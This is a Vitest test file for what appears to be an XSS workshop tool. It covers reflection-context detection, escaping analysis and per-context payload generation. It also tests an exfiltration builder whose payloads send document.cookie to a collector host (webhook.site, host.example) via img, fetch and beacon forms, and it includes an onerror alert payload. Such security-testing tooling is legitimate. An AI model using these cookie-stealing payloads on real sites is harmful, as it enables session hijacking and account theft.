import { describe, expect, it } from 'vitest';
import tool from './xss-workshop';
import { analyzeEscaping, breakoutChar, detectContexts } from './_xss-contexts';
import { buildExfil, generatePayloads } from './_xss-payloads';
import { resultToText } from '../../core/result-text';
import type { ToolResult } from '../../core/types';

const M = 'xMARKERx';
const ctx1 = (html: string) => detectContexts(html, M)[0]!;

describe('context detection', () => {
  const cases: [string, string][] = [
    [`<div>${M}</div>`, 'html'],
    [`<input value="${M}">`, 'attr-double'],
    [`<input value='${M}'>`, 'attr-single'],
    [`<input value=${M}>`, 'attr-unquoted'],
    [`<div class=${M} id=y>`, 'attr-unquoted'],
    [`<div ${M}>`, 'tag'],
    [`<a href="${M}">x</a>`, 'url'],
    [`<a href=${M}>x</a>`, 'url'],
    [`<img onerror="${M}">`, 'event-handler'],
    [`<script>var a="${M}";</script>`, 'js-string-double'],
    [`<script>var a='${M}';</script>`, 'js-string-single'],
    [`<script>var a=\`${M}\`;</script>`, 'js-string-template'],
    [`<script>var a=${M};</script>`, 'js'],
    [`<!-- ${M} -->`, 'comment'],
    [`<style>a{content:"${M}"}</style>`, 'css'],
    [`<div style="color:${M}">`, 'css'],
  ];
  for (const [html, want] of cases) {
    it(`${want}: ${html}`, () => {
      expect(ctx1(html).context).toBe(want);
    });
  }

  it('reports the attribute name', () => {
    expect(ctx1(`<a href="${M}">`).attr).toBe('href');
    expect(ctx1(`<img onmouseover="${M}">`).attr).toBe('onmouseover');
  });

  it('finds every reflection, not just the first', () => {
    const occ = detectContexts(`<b>${M}</b><input value="${M}">`, M);
    expect(occ.map((o) => o.context)).toEqual(['html', 'attr-double']);
  });

  it('a script string closed before the marker is code again', () => {
    expect(ctx1(`<script>var a="ok";${M}</script>`).context).toBe('js');
  });

  it('a comment closed before the marker is HTML again', () => {
    expect(ctx1(`<!-- note --> ${M}`).context).toBe('html');
  });

  it('returns nothing when the marker is absent', () => {
    expect(detectContexts('<p>no marker here</p>', M)).toEqual([]);
  });
});

describe('escaping of the probe after the marker', () => {
  it('raw specials are reported as usable', () => {
    const e = analyzeEscaping(`'"<>`);
    expect(e.raw).toContain('<');
    expect(e.raw).toContain('>');
    expect(e.raw).toContain('"');
    expect(e.raw).toContain("'");
  });
  it('HTML-entity encoded specials are reported as neutralised', () => {
    const e = analyzeEscaping('&lt;&gt;&quot;&#39;');
    expect(e.encoded).toContain('<');
    expect(e.encoded).toContain('"');
    expect(e.raw).toEqual([]);
  });
  it('backslash-escaped quotes count as encoded (JS string context)', () => {
    const e = analyzeEscaping('\\"ok');
    expect(e.encoded).toContain('"');
    expect(e.raw).not.toContain('"');
  });
  it('breakoutChar matches the context', () => {
    expect(breakoutChar('attr-double')).toBe('"');
    expect(breakoutChar('attr-single')).toBe("'");
    expect(breakoutChar('html')).toBe('<');
    expect(breakoutChar('js-string-template')).toBe('`');
    expect(breakoutChar('event-handler')).toBeNull();
  });
});

describe('payload generator', () => {
  it('double-quoted attribute payloads break out with a quote and add a handler', () => {
    const p = generatePayloads('attr-double');
    expect(p.some((x) => x.payload.startsWith('"'))).toBe(true);
    expect(p.some((x) => x.bypass === 'eventHandler')).toBe(true);
  });
  it('HTML context offers a no-<script> vector', () => {
    const p = generatePayloads('html');
    expect(p.some((x) => x.bypass === 'img')).toBe(true);
    expect(p.some((x) => x.payload.includes('onerror'))).toBe(true);
  });
  it('JS template context uses ${…}', () => {
    expect(generatePayloads('js-string-template').some((x) => x.payload.includes('${'))).toBe(true);
  });
  it('comment context closes the comment first', () => {
    expect(generatePayloads('comment').every((x) => x.payload.startsWith('-->'))).toBe(true);
  });
  it('every context yields at least two payloads', () => {
    for (const c of ['html', 'attr-double', 'js', 'url', 'css', 'comment'] as const) {
      expect(generatePayloads(c).length).toBeGreaterThanOrEqual(2);
    }
  });
});

describe('exfil builder', () => {
  it('substitutes the collector URL into every form and reads document.cookie', () => {
    const forms = buildExfil('https://abcd.webhook.site');
    expect(forms.map((f) => f.form)).toEqual(['imgScript', 'imgOnerror', 'fetch', 'beacon']);
    for (const f of forms) {
      expect(f.payload).toContain('https://abcd.webhook.site');
      expect(f.payload).toContain('document.cookie');
    }
  });
  it('uses & when the URL already has a query string', () => {
    const img = buildExfil('https://host.example/log?id=1').find((f) => f.form === 'imgScript')!;
    expect(img.payload).toContain('?id=1&c=');
  });
  it('trims the URL and a trailing separator', () => {
    const img = buildExfil('  https://host.example/log?  ').find((f) => f.form === 'imgScript')!;
    expect(img.payload).toContain('"https://host.example/log?c="');
  });
});

const text = (r: ToolResult) => resultToText(r);
const run = (input: string, options: Record<string, unknown>) =>
  text(tool.run(input, options as never) as ToolResult);

describe('tool run()', () => {
  it('context mode names the context and whether a breakout is possible', () => {
    const out = run(`<input value="${M}'"<>">`, { mode: 'context', marker: M });
    expect(out).toContain('Double-quoted attribute');
    expect(out).toContain('you can break out');
  });
  it('context mode warns when the marker is missing', () => {
    expect(run('<p>nope</p>', { mode: 'context', marker: M })).toContain('is not in the input');
  });
  it('payloads mode auto-detects the context from the marker', () => {
    const out = run(`<input value="${M}">`, { mode: 'payloads', context: 'auto', marker: M });
    expect(out).toContain('Double-quoted attribute');
    expect(out).toContain('onmouseover');
  });
  it('exfil mode builds a cookie stealer for the given collector', () => {
    const out = run('x', {
      mode: 'exfil',
      collector: 'https://abcd.webhook.site',
      context: 'auto',
    });
    expect(out).toContain('https://abcd.webhook.site');
    expect(out).toContain('document.cookie');
    expect(out).toContain('HttpOnly');
  });
  it('sandbox mode returns a sandbox block carrying the payload', () => {
    const payload = `<img src=x onerror=alert(1)>`;
    const result = tool.run(payload, { mode: 'sandbox' } as never) as ToolResult;
    expect(result.some((o) => o.type === 'sandbox')).toBe(true);
    expect(text(result)).toContain('onerror');
  });
  it('help mode gives the webhook.site walkthrough', () => {
    const out = run('x', { mode: 'help' });
    expect(out).toContain('webhook.site');
    expect(out).toContain('document.cookie');
  });
});

describe('tool metadata', () => {
  it('detects the marker on the home page', () => {
    const d = tool.detect?.({ text: `<input value="${M}">`, bytes: new Uint8Array(), name: 'r' });
    expect(d?.options).toEqual({ mode: 'context' });
  });
  it('every example reflects a real behaviour', () => {
    for (const ex of tool.examples) {
      const input = typeof ex.input === 'string' ? ex.input : '';
      const out = text(tool.run(input as never, (ex.options ?? {}) as never) as ToolResult);
      expect(out).toContain(ex.expect);
    }
  });
});
